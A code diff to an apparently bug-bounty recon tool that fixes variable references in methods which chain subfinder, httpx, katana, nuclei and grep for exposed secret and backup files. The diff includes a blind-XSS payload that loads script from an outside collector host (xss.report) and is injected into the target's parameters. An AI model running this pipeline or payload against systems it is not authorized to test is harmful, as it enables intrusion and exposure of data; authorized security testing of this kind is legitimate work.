@@ -149,12 +149,12 @@ class AutomationTool:
             f.write("\n".join(domains_and_subdomains))
 
         os.system(f"subfinder -dL {bbscope_dir}/final_domains_and_subdomains.txt -all -recursive > {bbscope_dir}/large_subdomains.txt")
-        os.system(f"nuclei -l {bbscope_dir}/large_subdomains.txt -t {REQUIRED}/nuclei-templates ")
+        os.system(f"nuclei -l {bbscope_dir}/large_subdomains.txt -t {self.REQUIRED}/nuclei-templates ")
 
     def enum_subdomains(self, target):
         print(Fore.YELLOW + "[+] Enumeration Phase Running..." + Style.RESET_ALL)
         os.system(f"subfinder -d {target} -all -recursive > {target}-subdomain.txt")
-        os.system(f"cat {target}-subdomain.txt | {REQUIRED}/go/bin/httpx -silent -threads 200 > {target}-subdomains_alive.txt")
+        os.system(f"cat {target}-subdomain.txt | {self.REQUIRED}/go/bin/httpx -silent -threads 200 > {target}-subdomains_alive.txt")
         os.system(f"katana -u {target}-subdomains_alive.txt -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -kf -jc -fx -ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg -o {target}-allurls.txt")
         os.system(f"cat {target}-allurls.txt | grep -E \".txt|\\.log|\\.cache|\\.secret|\\.db|\\.backup|\\.yml|\\.json|\\.gz|\\.rar|\\.zip|\\.config|\\.js$\" >> {target}-sensitive.txt")
         os.system(f"cat {target}-sensitive.txt | nuclei -t exposures -o {target}-nuclei.txt")
@@ -169,7 +169,7 @@ class AutomationTool:
 
     def xss_finding(self, target):
         print(Fore.YELLOW + "[+] XSS finder phase running..." + Style.RESET_ALL)
-        os.system(f"subfinder -d {target} | {REQUIRED}/go/bin/httpx -silent | katana -ps -f qurl | gf xss | bxss -appendMode -payload '\"><script src=https://xss.report/c/jojo></script>' -parameters")
+        os.system(f"subfinder -d {target} | {self.REQUIRED}/go/bin/httpx -silent | katana -ps -f qurl | gf xss | bxss -appendMode -payload '\"><script src=https://xss.report/c/jojo></script>' -parameters")
         os.system(f"paramspider -l {target}-subdomains_alive.txt")
         os.system(f"cat results/* | sed '/FUZZ//g' > final.txt")
 
